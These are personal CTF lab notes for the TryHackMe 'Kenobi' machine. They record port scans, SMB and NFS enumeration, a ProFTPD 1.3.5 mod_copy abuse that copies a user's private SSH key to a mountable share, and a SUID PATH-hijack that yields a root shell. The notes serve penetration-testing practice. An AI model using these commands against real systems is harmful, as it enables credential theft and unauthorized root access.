---
title: Kenobi
draft: 
tags:
  - thm
  - oscp
  - easy
---
These are rough notes I took while exploiting Kenobi. I am not having this submitted as a write-up to THM. However, I want this here for posterity's sake.

# Port Scans

## Discovered Ports
```
sudo nmap -Pn -p 80,139,111,21,445,22,46229 -O -sV 10.10.210.122
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.210.122
Host is up (0.17s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
46229/tcp open  nlockmgr    1-4 (RPC #100021)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
#### *These were discovered via `nmap -Pn -p- <IP> -v` that was cancelled upon finding the port 46229

## Individual Ports
```
nmap -Pn -sV -sC $IP -p 445            
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.210.122
Host is up (0.18s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: KENOBI

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-06-29T01:01:58
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-06-28T20:01:58-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

# Enumeration

## SMB
### Enumerating SMB
##### Enumerating Shares
```
nmap -Pn -sV --script=smb-enum-shares $IP -p 445
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.210.122
Host is up (0.18s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: KENOBI

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.210.122\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.210.122\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.210.122\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

##### Enumerating Users
- Came up empty
##### Enumerating OS
```
nmap -Pn -sV --script=smb-os-discovery $IP -p 445
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.210.122
Host is up (0.18s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: KENOBI

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-06-28T20:14:00-05:00
```

## FTP
```
nmap -Pn -sV -script=ftp-anon -p 21 $IP
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.210.122
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
Service Info: OS: Unix
```

## RPCBIND
```
nmap -Pn -p 111 -sC $IP                
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.210.122
Host is up (0.18s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      44853/tcp6  mountd
|   100005  1,2,3      49954/udp6  mountd
|   100005  1,2,3      52876/udp   mountd
|   100005  1,2,3      58207/tcp   mountd
|   100021  1,3,4      44887/tcp6  nlockmgr
|   100021  1,3,4      46229/tcp   nlockmgr
|   100021  1,3,4      58176/udp   nlockmgr
|   100021  1,3,4      58753/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl

Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds

```

```
ls -la /usr/share/nmap/scripts | grep -e rpc    
-rw-r--r-- 1 root root  4437 Nov  1  2023 bitcoinrpc-info.nse
-rw-r--r-- 1 root root  4398 Nov  1  2023 deluge-rpc-brute.nse
-rw-r--r-- 1 root root  2952 Nov  1  2023 metasploit-msgrpc-brute.nse
-rw-r--r-- 1 root root  3199 Nov  1  2023 metasploit-xmlrpc-brute.nse
-rw-r--r-- 1 root root  3235 Nov  1  2023 msrpc-enum.nse
-rw-r--r-- 1 root root  4100 Nov  1  2023 nessus-xmlrpc-brute.nse
-rw-r--r-- 1 root root  2140 Nov  1  2023 rpcap-brute.nse
-rw-r--r-- 1 root root  2654 Nov  1  2023 rpcap-info.nse
-rw-r--r-- 1 root root  8820 Nov  1  2023 rpc-grind.nse
-rw-r--r-- 1 root root  4601 Nov  1  2023 rpcinfo.nse
-rw-r--r-- 1 root root  4362 Nov  1  2023 xmlrpc-methods.nse

ls -la /usr/share/nmap/scripts | grep -e nfs
-rw-r--r-- 1 root root 14534 Nov  1  2023 nfs-ls.nse
-rw-r--r-- 1 root root  2714 Nov  1  2023 nfs-showmount.nse
-rw-r--r-- 1 root root  9947 Nov  1  2023 nfs-statfs.nse

nmap -Pn -p 111 --script=nfs-ls,nfs-showmount,nfs-statfs $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 21:43 EDT
Nmap scan report for 10.10.210.122
Host is up (0.18s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

# Discovery

## SMB
```
smbclient \\\\10.10.210.122\\anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877108 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (16.8 KiloBytes/sec) (average 16.8 KiloBytes/sec)
smb: \> exit
```

## FTP
```
searchsploit proftpd 1.3.5
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                        | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                    | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                  | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


## NFS/RPCBIND
*done after the exploitation of ftp*
```
mkdir kenobiNFS  
sudo mount 10.10.210.122:/var kenobiNFS  /
ls -la /mnt/kenobiNFS
```

```
la -la kenobiNFS 
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 kali kali  4096 Jun 28 21:47 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root avahi 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Jun 28 21:38 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```

```
cd kenobiNFS/tmp/
cp id_rsa ../../
```

```
chmod 600 id_rsa 
ssh -i id_rsa kenobi@$IP 
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

# Exploitation
## FTP

```
>nc $IP 21
>SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
>SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

# Privilege Escalation
```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

```
kenobi@kenobi:~$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
menu.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```

```
strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
```

```
enobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ ls
systemd-private-e182a74d852f4be694f5b4da625ca250-systemd-timesyncd.service-yKRHod
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# ls
curl  systemd-private-e182a74d852f4be694f5b4da625ca250-systemd-timesyncd.service-yKRHod
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
```
